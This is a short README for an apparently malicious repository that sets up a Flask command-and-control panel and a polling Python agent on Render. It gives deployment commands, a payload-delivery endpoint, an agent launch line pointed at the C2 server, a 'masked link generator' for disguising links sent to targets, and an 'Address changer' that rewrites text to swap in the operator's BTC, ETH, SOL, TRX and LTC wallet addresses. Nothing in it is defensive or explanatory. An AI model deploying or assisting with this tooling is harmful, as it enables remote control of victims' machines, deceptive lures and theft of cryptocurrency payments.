C2 Panel (Flask) — Sk-2222

Files
- c2_app.py — Flask control panel and APIs
- agent.py — polling Python agent
- Procfile, requirements.txt, render.yaml — deployment config

Deploy on Render (short)
- Create a new Web Service from this repo
- Build: pip install -r requirements.txt
- Start: gunicorn c2_app:app --bind 0.0.0.0:$PORT
- Env var: PANEL_TOKEN=<your token>

Use
- Panel: https://<your-service>.onrender.com/?token=<PANEL_TOKEN>
- Payload: https://<your-service>.onrender.com/payload?server=https://<your-service>.onrender.com
- Agent run: C2_SERVER=https://<your-service>.onrender.com python3 agent.py
- Masked link generator: /gen_mask_link?u=<target>&fname=<file>&server=https://<your-service>.onrender.com

Address changer
- In the panel, enable Address changer and fill BTC/ETH/SOL/TRX/LTC addresses
- POST /api/transform with {"text": "..."} to rewrite text blocks server-side
